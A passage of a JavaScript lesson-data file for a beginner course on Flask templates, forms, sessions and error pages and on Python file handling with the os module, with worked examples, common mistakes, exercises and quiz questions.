  ['p', "**Step 4 — mark the ends.** Both flags are true when there is exactly one item, which is usually what you want:"],
  ['code', 'jinja', `<li class="{{ 'first' if loop.first }} {{ 'last' if loop.last }}">{{ h }}</li>`],
  ['p', "**Step 5 — a one-line summary.** `loop.last` gives you a comma-separated list with no trailing comma:"],
  ['code', 'jinja', `<p>{% for h in hobbies %}{{ h }}{% if not loop.last %}, {% endif %}{% endfor %}</p>`],
  ['code', 'text', `gaming, coding, reading`],
  ['h', "Tracing the loop variable"],
  ['p', "If you are ever unsure what `loop` holds, print it:"],
  ['code', 'jinja', `{% for h in hobbies %}
  {{ loop.index }} {{ loop.index0 }} {{ loop.first }} {{ loop.last }} {{ loop.length }}<br>
{% endfor %}`],
  ['code', 'text', `1 0 True  False 3
2 1 False False 3
3 2 False True  3`],
  ['h', "Common mistakes"],
  ['ul', [
    "**Using `loop` outside a `{% for %}`** — it does not exist there, so it renders as nothing rather than erroring.",
    "**Expecting `{% set %}` to accumulate across passes** — each iteration has its own scope. Compute totals in Python.",
    "**Confusing filters and tests** — `hobbies|length` transforms, `hobbies is empty` asks a question. `hobbies|empty` is not a thing.",
    "**Forgetting `{% endfor %}`** — Jinja does not close blocks by indentation, and the error points at the end of the file rather than the loop."
  ]]
],

"flask:7": [
  ['h', "Worked example: two pages, one shell"],
  ['p', "Build it in the order you would actually build it."],
  ['p', "**Step 1 — `templates/base.html`.** Everything both pages share, with named holes:"],
  ['code', 'jinja', `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>{% block title %}Learning Flask{% endblock %}</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
  <nav>
    <a href="{{ url_for('home') }}">home</a>
    <a href="{{ url_for('about') }}">about</a>
  </nav>
  <main>{% block content %}{% endblock %}</main>
</body>
</html>`],
  ['p', "**Step 2 — `templates/home.html`** becomes only the part that is unique to it:"],
  ['code', 'jinja', `{% extends "base.html" %}

{% block title %}Home{% endblock %}

{% block content %}
  <h1>Hello, {{ name }}</h1>
  <ul>
    {% for h in hobbies %}<li>{{ h }}</li>{% else %}<li>nothing yet</li>{% endfor %}
  </ul>
{% endblock %}`],
  ['p', "**Step 3 — `templates/about.html`**, four lines:"],
  ['code', 'jinja', `{% extends "base.html" %}
{% block title %}About{% endblock %}
{% block content %}<p>They not really care about us</p>{% endblock %}`],
  ['p', "**Step 4 — the route stops returning a bare string:**"],
  ['code', 'python', `@app.route("/about")
def about():
    return render_template("about.html")`],
  ['p', "The nav now appears on both pages, defined once. Adding a third link means editing `base.html` alone."],
  ['h', "What the browser actually receives"],
  ['p', "Inheritance is resolved on the server. `/about` sends this — there is no trace of the block structure:"],
  ['code', 'html', `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>About</title>...</head>
<body>
  <nav><a href="/">home</a> <a href="/about">about</a></nav>
  <main><p>They not really care about us</p></main>
</body>
</html>`],
  ['h', "Common mistakes"],
  ['ul', [
    "**Markup outside a block in a child** — silently discarded. Nothing errors; your content simply is not there.",
    "**`{% extends %}` not on the first line** — `TemplateSyntaxError: extended multiple times` or similar.",
    "**Overriding a block and losing the parent's content** — that is what `{{ super() }}` is for.",
    "**Defining two blocks with the same name** in one template — Jinja raises; block names must be unique per file.",
    "**Editing `base.html` and seeing no change** — that is a browser cache of the CSS, not a template problem. Templates are never cached in debug mode."
  ]]
],

"flask:8": [
  ['h', "Worked example: your first stylesheet, start to finish"],
  ['p', "**Step 1 — make the folder.** Flask already has a route for it; you only have to create it:"],
  ['code', 'text', `learn/
  hello.py
  static/
    css/
      style.css`],
  ['p', "**Step 2 — write something unmistakable.** Do not start subtle; you want to know instantly whether it loaded:"],
  ['code', 'css', `body {
  font-family: system-ui, sans-serif;
  background: #EDF0EE;
  color: #14201E;
  max-width: 40rem;
  margin: 2rem auto;
  padding: 0 1rem;
}

h1 { color: #0E7C70; }`],
  ['p', "**Step 3 — link it from `base.html`:**"],
  ['code', 'jinja', `<link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">`],
  ['p', "**Step 4 — reload.** If the background did not change, work through this in order:"],
  ['tbl',
    ["Check", "Where", "Means"],
    [
      ["Is the request 404?", "devtools → Network → style.css", "wrong path or wrong folder"],
      ["Is it 200 but grey?", "same panel, `(from disk cache)`", "old copy — Ctrl+Shift+R"],
      ["200 and fresh, no change?", "devtools → Elements → Styles", "the file loaded; your selector is wrong"],
      ["No request at all?", "Network panel is empty of it", "the `<link>` is not in the rendered HTML"]
    ]
  ],
  ['p', "That order matters. Most people jump straight to rewriting the CSS when the file was never loaded at all."],
  ['h', "What url_for produced"],
  ['code', 'html', `<link rel="stylesheet" href="/static/css/style.css">`],
  ['p', "Exactly what you would have typed by hand — which is the point. It costs nothing now and keeps working if the app ever moves under a prefix."],
  ['h', "Common mistakes"],
  ['ul', [
    "**`filename='/css/style.css'`** with a leading slash — the path is relative to `static/`, so this looks for `static//css/...` and 404s.",
    "**Backslashes on Windows** — `filename='css\\\\style.css'` fails. Always forward slashes in URLs.",
    "**Folder named `statics` or `Static`** — Flask looks for exactly `static`, and it is case-sensitive on Linux even when it works on Windows.",
    "**Editing the CSS and reloading normally** — the browser serves its cache. This costs beginners more time than any other single thing.",
    "**Putting the stylesheet in `templates/`** — that folder is for Jinja, and nothing there is served to the browser."
  ]]
],

"flask:9": [
  ['h', "Worked example: a form, from nothing to working"],
  ['p', "**Step 1 — the template, `templates/greet.html`:**"],
  ['code', 'jinja', `{% extends "base.html" %}
{% block content %}
  <form method="post" action="{{ url_for('greet') }}">
    <label for="name">Your name</label>
    <input id="name" name="name" value="{{ request.form.get('name', '') }}">
    <button type="submit">Say hello</button>
  </form>
  {% if error %}<p class="error">{{ error }}</p>{% endif %}
{% endblock %}`],
  ['p', "**Step 2 — the route:**"],
  ['code', 'python', `@app.route("/greet", methods=["GET", "POST"])
def greet():
    if request.method == "POST":
        name = request.form.get("name", "").strip()
        if not name:
            return render_template("greet.html", error="Please enter a name.")
        return "shalom " + name
    return render_template("greet.html")`],
  ['p', "**Step 3 — watch the terminal as you use it.** Two different lines for the two methods:"],
  ['code', 'shell', `"GET  /greet HTTP/1.1" 200 -     <- you loaded the page
"POST /greet HTTP/1.1" 200 -     <- you pressed the button`],
  ['h', "Following one field through the whole trip"],
  ['p', "It helps to see exactly where the value lives at each stage:"],
  ['tbl',
    ["Stage", "The value is", "Called"],
    [
      ["In the HTML", "`<input name=\"name\">`", "the field's name"],
      ["On submit", "`name=itay` in the request body", "form-encoded data"],
      ["In Flask", "`request.form[\"name\"]`", "a MultiDict entry"],
      ["In your code", "`\"itay\"`", "a plain string, always"]
    ]
  ],
  ['p', "Every one of those steps is keyed on `name=\"name\"`. Change the attribute and the whole chain breaks silently."],
  ['h', "Then make it survive a reload"],
  ['p', "Returning text from the POST leaves the browser on a POST. Redirect so the last thing that happened was a GET:"],
  ['code', 'python', `from flask import flash, redirect, url_for

@app.route("/greet", methods=["GET", "POST"])
def greet():
    if request.method == "POST":
        name = request.form.get("name", "").strip()
        if not name:
            flash("Please enter a name.", "error")
            return redirect(url_for("greet"))
        flash("Hello, " + name, "success")
        return redirect(url_for("home"))
    return render_template("greet.html")`],
  ['code', 'shell', `"POST /greet HTTP/1.1" 302 -
"GET  /       HTTP/1.1" 200 -`],
  ['h', "Common mistakes"],
  ['ul', [
    "**No `methods=[\"POST\"]`** → `405 Method Not Allowed`. Right URL, wrong verb.",
    "**No `name` attribute on the input** → the field is never sent, and `.get` quietly returns your default.",
    "**Reading `request.args` after a POST** → empty, because the data is in the body. Use `request.form`.",
    "**`method=\"post\"` missing on the `<form>`** → the browser defaults to GET and puts your data in the URL.",
    "**Trusting `required`** → it is a browser convenience. Anything can send a request without it, so check on the server too.",
    "**Not calling `.strip()`** → `\"   \"` is not empty, so a whitespace-only name sails through your `if not name` check."
  ]]
],

"flask:10": [
  ['h', "Worked example: the full round trip of one flash"],
  ['p', "Follow a single message from creation to disappearance. This is the part that feels like magic until you see the sequence."],
  ['code', 'python', `@app.route("/add", methods=["POST"])
def add():
    flash("Added: milk", "success")      # 1. queued in the session
    return redirect(url_for("index"))    # 2. 302 sent to the browser`],
  ['code', 'shell', `"POST /add HTTP/1.1" 302 -      <- request 1: flash queued, redirect sent
"GET  /     HTTP/1.1" 200 -      <- request 2: flash read and removed`],
  ['p', "In `base.html`, on that second request:"],
  ['code', 'jinja', `{% with messages = get_flashed_messages(with_categories=true) %}
  {% for category, message in messages %}
    <li class="flash flash--{{ category }}">{{ message }}</li>
  {% endfor %}
{% endwith %}`],
  ['p', "Reload that page and the message is gone, because reading emptied the queue. That is the whole life cycle:"],
  ['code', 'text', `request 1 (POST)   flash()  ->  session cookie now holds the message
                   redirect ->  302
request 2 (GET)    template ->  get_flashed_messages() reads AND clears
request 3 (reload) template ->  nothing left to show`],
  ['h', "Styling by category"],
  ['p', "The second argument is a free string that becomes a CSS class:"],
  ['code', 'python', `flash("Saved.", "success")
flash("Title cannot be empty.", "error")`],
  ['code', 'css', `.flash { border-left: 3px solid; padding: .5rem .75rem; margin-bottom: .5rem; }
.flash--success { border-color: #0E7C70; background: #DCEBE8; }
.flash--error   { border-color: #A96A22; background: #F2E6D6; }`],
  ['h', "Choosing a redirect code"],
  ['tbl',
    ["You want", "Use", "Because"],
    [
      ["After a POST", "`redirect(url)` — 302", "temporary, never cached"],
      ["A URL that moved for good", "`redirect(url, code=301)`", "tells search engines to update"],
      ["A POST to stay a POST", "`redirect(url, code=307)`", "302 and 301 may turn it into a GET"],
      ["Anything while developing", "**302**", "a wrong 301 is cached for months"]
    ]
  ],
  ['h', "Common mistakes"],
  ['ul', [
    "**`return url_for(\"home\")`** instead of `return redirect(url_for(\"home\"))` — sends the string `/` as the page body.",
    "**Rendering flashes in more than one template** — the first read empties the queue, so the message appears in only one of them, seemingly at random.",
    "**No `secret_key`** → `RuntimeError: The session is unavailable...`. Flashes live in the session.",
    "**Flashing and then rendering instead of redirecting** — the message shows immediately, then again on the next page, because nothing consumed it in between.",
    "**A stray 301 during development** — the browser keeps redirecting after you fix the code. Clear site data, and default to 302."
  ]]
],

"flask:11": [
  ['h', "Worked example: reading your own session cookie"],
  ['p', "The fastest way to understand Flask sessions is to decode one. Do this on your own machine with your own cookie."],
  ['p', "**Step 1 — put something in the session:**"],
  ['code', 'python', `@app.route("/set-demo")
def set_demo():
    session["user"] = "itay"
    session["is_admin"] = False
    return "session written — now look at your cookie"`],
  ['p', "**Step 2 — copy the cookie.** Devtools → Application → Cookies → `session`. It looks like three dot-separated parts:"],
  ['code', 'text', `eyJpc19hZG1pbiI6ZmFsc2UsInVzZXIiOiJpdGF5In0.ZqABCD.9xKf3nQ2...
└──────────── payload ────────────┘ └time┘ └─ signature ─┘`],
  ['p', "**Step 3 — decode the first part.** No key required, by anyone, from any machine:"],
  ['code', 'python', `import base64
raw = "eyJpc19hZG1pbiI6ZmFsc2UsInVzZXIiOiJpdGF5In0"
print(base64.urlsafe_b64decode(raw + "=="))
# b'{"is_admin":false,"user":"itay"}'`],
  ['p', "There it is, in plain text. **Signed means nobody can change it. It does not mean nobody can read it.**"],
  ['h', "What the signature actually stops"],
  ['p', "Try editing the payload to say `\"is_admin\":true`, re-encode it, paste it back into the cookie and reload. Flask discards the whole session and treats you as a new visitor — because the signature no longer matches the contents."],
  ['code', 'text', `valid cookie    ->  session = {"user": "itay"}
edited payload  ->  session = {}          (silently, no error)`],
  ['p', "It fails silently on purpose: a tampered cookie is indistinguishable from a corrupt one, and an error message would tell an attacker they were close."],
  ['h', "So what goes in a session"],
  ['tbl',
    ["Value", "Safe?", "Why"],
    [
      ["`session[\"user_id\"] = 42`", "yes", "an id means nothing without your database"],
      ["`session[\"theme\"] = \"dark\"`", "yes", "harmless if read"],
      ["`session[\"is_admin\"] = True`", "yes, but", "unforgeable, though visible — look privileges up server-side instead"],
      ["`session[\"password\"] = ...`", "**no**", "readable, and re-sent on every request"],
      ["`session[\"card\"] = ...`", "**no**", "same, plus it is stored on their disk"]
    ]
  ],
  ['h', "Generating a real key"],
  ['code', 'shell', `python -c "import secrets; print(secrets.token_hex(32))"`],
  ['code', 'python', `import os
app.secret_key = os.environ["SECRET_KEY"]     # crash loudly if it is missing`],
  ['h', "Common mistakes"],
  ['ul', [
    "**Thinking signed means encrypted** — the single most common misunderstanding. The payload is readable base64.",
    "**A hardcoded key committed to git** — anyone with it can forge a session claiming to be anyone.",
    "**Storing a whole user object** — cookies cap near 4KB and travel on every request. Store an id.",
    "**`session[\"x\"] = ...` outside a request** — `RuntimeError: Working outside of request context`.",
    "**Mutating a nested value** — `session[\"cart\"].append(x)` is not detected. Reassign, or set `session.modified = True`."
  ]]
],

"os:3": [
  ['h', "Worked example: config that changes without editing code"],
  ['p', "The point of environment variables is that the same file runs differently in different places. Build that up."],
  ['p', "**Step 1 — read with a default, and convert explicitly:**"],
  ['code', 'python', `import os

PORT = int(os.environ.get("PORT", "5000"))
DEBUG = os.environ.get("DEBUG", "").strip().lower() in {"1", "true", "yes", "on"}
SECRET = os.environ.get("SECRET_KEY")

if not SECRET:
    raise RuntimeError("SECRET_KEY is not set")`],
  ['p', "**Step 2 — run it three ways** and watch the same code behave differently:"],
  ['code', 'shell', `# nothing set
python app.py
# RuntimeError: SECRET_KEY is not set

$env:SECRET_KEY = "dev-key"
python app.py
# starts on port 5000, debug off

$env:PORT = "8080"; $env:DEBUG = "true"
python app.py
# starts on port 8080, debug on`],
  ['p', "No line of Python changed between those runs. That is the entire idea."],
  ['h', "Why the boolean needs care"],
  ['p', "This is the trap worth internalising — every value is a string, and every non-empty string is truthy:"],
  ['code', 'python', `os.environ["DEBUG"] = "False"

bool(os.environ["DEBUG"])          # True   <- debug mode is now ON
os.environ["DEBUG"] == "true"      # False  <- correct
os.environ["DEBUG"].lower() in {"1", "true", "yes", "on"}   # False, and tolerant`],
  ['h', "Where the values come from"],
  ['tbl',
    ["Set with", "Lives for", "Good for"],
    [
      ["`$env:X = \"v\"`", "this terminal only", "a quick test"],
      ["`[Environment]::SetEnvironmentVariable(\"X\",\"v\",\"User\")`", "permanently, for you", "your own machine"],
      ["A `.env` file + `python-dotenv`", "this project", "development — and `.env` goes in `.gitignore`"],
      ["The host's dashboard", "that deployment", "production"]
    ]
  ],
  ['code', 'python', `# .env  (never committed)
SECRET_KEY=a-real-random-value
DEBUG=true

# app.py
from dotenv import load_dotenv
load_dotenv()                    # reads .env into os.environ`],
  ['h', "Common mistakes"],
  ['ul', [
    "**`bool(os.environ.get(\"DEBUG\"))`** — `\"False\"` is truthy. This is how debug mode reaches production.",
    "**`int(os.environ[\"PORT\"])` with no default** — `KeyError` when unset, `ValueError` when it is not a number.",
    "**Committing `.env`** — add it to `.gitignore` before the first commit, not after.",
    "**Setting a variable in PowerShell and expecting VS Code to see it** — VS Code has its own environment. Use the `env` block in `launch.json`.",
    "**Falling back to a default secret** — `os.environ.get(\"SECRET_KEY\", \"dev\")` ships a known key. Fail loudly instead."
  ]]
],

"os:4": [
  ['h', "Worked example: a listing that reports real sizes"],
  ['p', "Build the thing everyone writes first, and watch it break in the usual way."],
  ['p', "**Attempt 1 — the natural version, which fails:**"],
  ['code', 'python', `import os

for name in os.listdir("logs"):
    print(name, os.path.getsize(name))

# FileNotFoundError: [WinError 2] The system cannot find
# the file specified: 'app.log'`],
  ['p', "`listdir` returned `'app.log'`, a bare name. Python looks for it in the **current working directory**, not in `logs/`, and it is not there."],
  ['p', "**Attempt 2 — rebuild the path:**"],
  ['code', 'python', `for name in os.listdir("logs"):
    path = os.path.join("logs", name)
    print(name, os.path.getsize(path), "bytes")

# app.log 184 bytes`],
  ['p', "**Attempt 3 — one disk trip instead of two.** `scandir` entries already know their type and stats:"],
  ['code', 'python', `with os.scandir("logs") as entries:
    for e in entries:
        if e.is_file():
            print(e.name, e.stat().st_size, "bytes")`],
  ['p', "**Attempt 4 — `glob`, which hands back paths you can use directly:**"],
  ['code', 'python', `import glob

for path in glob.glob("logs/*.log"):
    print(path, os.path.getsize(path), "bytes")

# logs\\app.log 184 bytes`],
  ['note', "Notice `glob` printed `logs\\app.log` — a real path — while `listdir` printed `app.log`. That single difference is the entire bug in attempt 1."],
  ['h', "Choosing between them"],
  ['tbl',
    ["You want", "Reach for", "Gives you"],
    [
      ["Just the names in one folder", "`os.listdir`", "bare names"],
      ["Names plus type or size", "`os.scandir`", "entries with metadata"],
      ["Everything matching a pattern", "`glob.glob`", "usable paths"],
      ["Everything, at any depth", "`os.walk`", "one folder at a time"]
    ]
  ],
  ['h', "Common mistakes"],
  ['ul', [
    "**Using a `listdir` name as a path** — the error above. It only ever works by accident, when your working directory happens to be that folder.",
    "**Assuming the order means something** — `listdir` order is filesystem-dependent. `sorted()` it if you care.",
    "**Calling `os.path.isdir(name)` in the loop** — same bug, and it silently returns `False` instead of raising.",
    "**Forgetting `recursive=True`** with `glob(\"**/*.log\")` — without it, `**` behaves like `*` and finds nothing deeper.",
    "**Not closing `scandir`** — use it in a `with` block; it holds an open OS handle."
  ]]
],

"os:5": [
  ['h', "Worked example: a cleanup script you can trust"],
  ['p', "Destructive scripts deserve more care than they usually get. Build one properly."],
  ['p', "**Step 1 — get the paths right and look, but touch nothing:**"],
  ['code', 'python', `import os

def clean(folder, pattern=".tmp", dry_run=True):
    removed = kept = failed = 0
    for name in os.listdir(folder):
        path = os.path.join(folder, name)
        if not os.path.isfile(path) or not name.endswith(pattern):
            kept += 1
            continue
        if dry_run:
            print("would delete", path)
            removed += 1
            continue
        try:
            os.remove(path)
            print("deleted", path)
            removed += 1
        except OSError as exc:
            print("could not delete", path, "-", exc)
            failed += 1
    print(f"{removed} matched, {kept} kept, {failed} failed")`],
  ['p', "**Step 2 — run it as-is.** The default is `dry_run=True`, so this is safe:"],
  ['code', 'text', `>>> clean("logs")
would delete logs\\old.tmp
would delete logs\\cache.tmp
2 matched, 1 kept, 0 failed`],
  ['p', "**Step 3 — only now opt in:**"],
  ['code', 'text', `>>> clean("logs", dry_run=False)
deleted logs\\old.tmp
deleted logs\\cache.tmp
2 matched, 1 kept, 0 failed`],
  ['warn', "The default matters more than it looks. If the argument were `dry_run=False`, a mistyped folder would delete before you saw anything. Making destruction opt-in costs one word."],
  ['h', "Why the try/except is not optional"],
  ['p', "Without it, one locked file aborts the whole run halfway through — some files gone, some not, and no summary:"],
  ['code', 'text', `deleted logs\\a.tmp
PermissionError: [WinError 32] The process cannot access the file
because it is being used by another process: 'logs\\\\b.tmp'
# c.tmp and d.tmp were never reached`],
  ['h', "Common mistakes"],
  ['ul', [
    "**Building the path by concatenation** — `folder + name` gives `logsapp.log`. Use `os.path.join`.",
    "**`shutil.rmtree` on a path you did not print first** — it is recursive and permanent, with no recycle bin.",
    "**`if os.path.exists(p): os.remove(p)`** — the file can vanish in between. Catch `FileNotFoundError` instead.",
    "**`os.rmdir` on a folder with contents** — raises. Only `shutil.rmtree` removes a populated folder.",
    "**Catching bare `OSError` around everything** — a permission problem then looks the same as a missing file. Catch narrowly."
  ]]
],

"os:6": [
  ['h', "Worked example: a report on your own project"],
  ['p', "Something small and genuinely useful — the ten largest files, with dates."],
  ['code', 'python', `import os, datetime

def human(n):
    for unit in ("B", "KB", "MB"):
        if n < 1024:
            return f"{n:.0f}{unit}"
        n /= 1024
    return f"{n:.1f}GB"

rows = []
with os.scandir(BASE_DIR) as entries:
    for e in entries:
        if not e.is_file():
            continue
        info = e.stat()                      # one call, both facts
        rows.append((info.st_size, info.st_mtime, e.name))

for size, mtime, name in sorted(rows, reverse=True)[:10]:
    when = datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M")
    print(f"{human(size):>8}  {when}  {name}")`],
  ['code', 'text', `   9.4KB  2026-08-01 15:12  hello.py
   1.8KB  2026-08-01 14:02  os.txt
    184B  2026-08-01 15:40  server_out.log`],
  ['p', "Note `e.stat()` is called once and both fields read from the result. `os.path.getsize` followed by `os.path.getmtime` would be two separate trips to disk for information the first call already had."],
  ['h', "The check-then-act trap, made concrete"],
  ['p', "This looks careful and is not:"],
  ['code', 'python', `if os.path.isfile(path):        # <- true right now
    size = os.path.getsize(path)  # <- may raise anyway`],
  ['p', "Between those two lines the file can be deleted, renamed, or replaced by a directory — by another program, or by another part of yours. The guard reads like protection while providing none. The version with no gap:"],
  ['code', 'python', `try:
    size = os.path.getsize(path)
except (FileNotFoundError, PermissionError):
    size = None`],
  ['p', "Use the predicates when you are *describing* the filesystem — building a listing, choosing a label. Use try/except when you are *acting* on it."],
  ['h', "Common mistakes"],
  ['ul', [
    "**Calling `getsize` and `getmtime` on the same file** — two stat calls where one would do.",
    "**Treating `st_mtime` as a date** — it is a float of seconds. Convert with `datetime.fromtimestamp`.",
    "**Relying on `st_ctime` for creation time** — creation on Windows, metadata-change on Linux.",
    "**Reading `False` from `isfile` as “does not exist”** — it also means “exists but is a directory”.",
    "**Comparing timestamps for equality after a copy** — only `shutil.copy2` preserves them."
  ]]
],

"os:7": [
  ['h', "Worked example: measuring your workspace"],
  ['p', "Run this on your own project and the numbers will surprise you."],
  ['p', "**Step 1 — walk everything:**"],
  ['code', 'python', `import os

total = count = 0
for dirpath, dirnames, filenames in os.walk(BASE_DIR):
    for name in filenames:
        total += os.path.getsize(os.path.join(dirpath, name))
        count += 1

print(f"{count} files, {total/1024/1024:.1f} MB")`],
  ['code', 'text', `18423 files, 214.7 MB`],
  ['p', "**Step 2 — prune the folders you never meant to include:**"],
  ['code', 'python', `SKIP = {".git", "__pycache__", "node_modules", ".venv", "dist"}

total = count = 0
for dirpath, dirnames, filenames in os.walk(BASE_DIR):
    dirnames[:] = [d for d in dirnames if d not in SKIP]     # in place
    for name in filenames:
        total += os.path.getsize(os.path.join(dirpath, name))
        count += 1

print(f"{count} files, {total/1024/1024:.1f} MB")`],
  ['code', 'text', `47 files, 0.6 MB`],
  ['p', "Eighteen thousand files down to forty-seven. Almost everything in a project directory is dependencies and history, not your code."],
  ['h', "Why the slice is not a style choice"],
  ['p', "Take the colons out and the pruning stops working, with no error:"],
  ['code', 'python', `dirnames = [d for d in dirnames if d not in SKIP]      # no effect
dirnames[:] = [d for d in dirnames if d not in SKIP]  # works`],
  ['p', "The first line points the local name `dirnames` at a **new** list. `os.walk` is still holding the original one and reads that to decide where to go next. The second line changes the contents of the object `walk` is holding, which is the only thing it looks at."],
  ['code', 'text', `without the slice:  18423 files   <- node_modules walked anyway
with the slice:        47 files`],
  ['h', "Common mistakes"],
  ['ul', [
    "**Forgetting `os.path.join(dirpath, name)`** — `filenames` are bare names, and `dirpath` changes every iteration.",
    "**Rebinding `dirnames` instead of slicing it** — silent, and the fix is two characters.",
    "**Deleting top-down** — `rmdir` needs an empty folder, so pass `topdown=False`.",
    "**Assuming a complete walk** — an unreadable folder is skipped silently unless you pass `onerror=`.",
    "**Following symlinks by accident** — `followlinks=True` can loop forever. The default is off for a reason."
  ]]
],

"os:8": [
  ['h', "Worked example: writing a file that cannot be corrupted"],
  ['p', "The naive version has a window where the file on disk is neither the old content nor the new:"],
  ['code', 'python', `with open("settings.json", "w", encoding="utf-8") as f:
    f.write(big_json)          # killed here -> file is truncated and invalid`],
  ['p', "`\"w\"` empties the file the moment it opens. Crash before the write finishes and you have destroyed the old copy without producing a new one."],
  ['p', "**The safe version** writes somewhere else, then swaps atomically:"],
  ['code', 'python', `import os

def write_atomic(path, text):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(text)
    os.replace(tmp, path)      # atomic: old or new, never half`],
  ['p', "A rename on the same filesystem is a single directory-entry update. There is no moment where a reader sees a partial file:"],
  ['code', 'text', `crash during f.write()   ->  settings.json untouched, stray .tmp left
crash during os.replace  ->  cannot happen; it either did or it did not`],
  ['h', "Why replace and not rename"],
  ['code', 'python', `os.rename(tmp, path)     # Windows: FileExistsError, because path exists
os.replace(tmp, path)    # both platforms: overwrite`],
  ['p', "`os.rename` overwrites silently on Linux and refuses on Windows. Code written on one and run on the other breaks. `os.replace` means the same thing everywhere, so use it whenever overwriting is the intent."],
  ['h', "A move that never overwrites"],
  ['code', 'python', `import os, shutil

def move_no_clobber(src, dst_dir):
    os.makedirs(dst_dir, exist_ok=True)
    root, ext = os.path.splitext(os.path.basename(src))
    target = os.path.join(dst_dir, root + ext)
    n = 2
    while os.path.exists(target):
        target = os.path.join(dst_dir, f"{root}-{n}{ext}")
        n += 1
    shutil.move(src, target)
    return target`],
  ['code', 'text', `move_no_clobber("a.txt", "backup")  ->  backup\\a.txt
move_no_clobber("a.txt", "backup")  ->  backup\\a-2.txt
move_no_clobber("a.txt", "backup")  ->  backup\\a-3.txt`],
  ['h', "Common mistakes"],
  ['ul', [
    "**Writing straight over the only copy** — one crash and both versions are gone.",
    "**`os.rename` across drives** — `OSError`. A rename cannot move bytes; `shutil.move` falls back to copy-then-delete.",
    "**`shutil.copy` when you needed timestamps** — only `copy2` preserves metadata.",
    "**Moving a file you still have open** — on Windows, `PermissionError [WinError 32]`. Almost always a missing `with` block.",
    "**Leaving the `.tmp` behind on failure** — wrap the write in try/finally if a stray file would matter."
  ]]
]

};

/* ═══════════════════════════════════════════════════════════
   LESSON CONTENT — second batch. Completes the Flask track.
   ═══════════════════════════════════════════════════════════ */
const LESSON_CONTENT_2 = {

"flask:12": {
  blocks: [
    ['p', "A 404 is not a bug — it is a correct answer to a request for something that does not exist. What is a bug is showing the visitor Flask's bare grey default when the rest of your site has a design."],
    ['h', "Your own error pages"],
    ['code', 'python', `@app.errorhandler(404)
def not_found(err):
    return render_template("404.html"), 404

@app.errorhandler(500)
def server_error(err):
    return render_template("500.html"), 500`],
    ['warn', "The `, 404` at the end is essential. Without it the page renders but the response says `200 OK`, which tells search engines and API clients that a missing page exists. The handler's return value is a normal Flask response, so the same tuple rule applies."],
    ['h', "Raising one deliberately"],
    ['code', 'python', `from flask import abort

@app.route("/task/<int:task_id>")
def detail(task_id):
    task = find_task(task_id)
    if task is None:
        abort(404)                 # jumps straight to the 404 handler
    return render_template("detail.html", task=task)`],
    ['p', "`abort()` raises an `HTTPException`. Flask catches it, finds your handler, and returns that. Nothing after `abort()` runs, so you rarely need an `else`."],
    ['tbl',
      ["Call", "Means"],
      [
        ["`abort(400)`", "the request itself was malformed"],
        ["`abort(403)`", "you are logged in, but not allowed"],
        ["`abort(404)`", "no such thing"],
        ["`abort(409)`", "conflicts with the current state"],
        ["`abort(429)`", "too many requests"]
      ]
    ],
    ['h', "500 is different"],
    ['p', "With `debug=True` you never reach a 500 handler — the interactive debugger takes over instead, which is what you want while developing. Test your 500 page with debug off."],
    ['warn', "Never echo the exception into the page. A traceback tells an attacker your file paths, library versions and sometimes your queries. Log it privately, show the visitor something plain."],
    ['code', 'python', `import logging

@app.errorhandler(500)
def server_error(err):
    app.logger.exception("unhandled error")     # full detail to the log
    return render_template("500.html"), 500     # nothing useful to the page`],
    ['h', "One handler for everything"],
    ['code', 'python', `from werkzeug.exceptions import HTTPException

@app.errorhandler(HTTPException)
def any_http_error(err):
    return render_template("error.html", code=err.code, name=err.name), err.code`],
    ['h', "Errors in an API"],
    ['p', "A JSON client cannot read an HTML error page. Branch on what was asked for:"],
    ['code', 'python', `@app.errorhandler(404)
def not_found(err):
    if request.path.startswith("/api/"):
        return jsonify(error="not found", path=request.path), 404
    return render_template("404.html"), 404`]
  ],
  ex: [
    { q: "Create `templates/404.html` extending `base.html`, register a handler, and visit a URL that does not exist.",
      a: "Check the terminal: it should still log `404`, not `200`. If it logs 200 you forgot the status in the return tuple.",
      code: ['python', `@app.errorhandler(404)
def not_found(err):
    return render_template("404.html"), 404`] },
    { q: "Return `render_template(\"404.html\")` without the `, 404`. What breaks, and how would you notice?",
      hint: "Look at the terminal, not the page.",
      a: "The page looks perfect and the status is `200 OK`. Nothing visibly fails — which is why it ships. A crawler indexes your error page as real content, and `fetch()` in JavaScript takes the `response.ok` branch." },
    { q: "Add `/task/<int:task_id>` that calls `abort(404)` for an unknown id. Why is no `else` needed after it?",
      a: "`abort` raises, so execution never continues past it. Flask catches the exception higher up and dispatches to your handler.",
      code: ['python', `@app.route("/task/<int:task_id>")
def detail(task_id):
    task = find_task(task_id)
    if task is None:
        abort(404)
    return render_template("detail.html", task=task)`] },
    { q: "Trigger a 500 with `debug=True`, then with `debug=False`. Why are the two so different?",
      hint: "One of them is a development tool.",
      a: "With debug on you get the interactive traceback, and your 500 handler is bypassed entirely. With it off you get your page. Test error pages with debug off, and never run debug on a public server — that console executes Python for anyone who can reach it." },
    { q: "Make one handler serve both HTML and JSON depending on the URL prefix.",
      hint: "`request.path`.",
      a: "Better still, check what the client asked for with `request.accept_mimetypes` — but a path prefix is clear, predictable and enough for most apps.",
      code: ['python', `@app.errorhandler(404)
def not_found(err):
    if request.path.startswith("/api/"):
        return jsonify(error="not found"), 404
    return render_template("404.html"), 404`] }
  ],
  quiz: [
    { q: "What does an error handler need besides the template?",
      opts: ["Nothing", "The status code in the return tuple", "A `methods=` argument", "A redirect"], correct: 1,
      why: "Without `, 404` the page renders with status 200 — it looks right and lies to every machine that reads it." },
    { q: "What does `abort(404)` do to the rest of the function?",
      opts: ["Nothing, it returns a value", "Raises, so nothing after it runs", "Returns None", "Logs and continues"], correct: 1,
      why: "It raises an HTTPException, which is why you rarely need an else branch after it." },
    { q: "Why does your 500 handler not run while debugging?",
      opts: ["It is broken", "The interactive debugger takes over instead", "500s cannot be handled", "Flask caches the first response"], correct: 1,
      why: "debug=True replaces error pages with the traceback console. Test your 500 page with debug off." },
    { q: "Why must an error page never show the exception text?",
      opts: ["It looks untidy", "It leaks paths, versions and queries to an attacker", "It is slow", "Flask forbids it"], correct: 1,
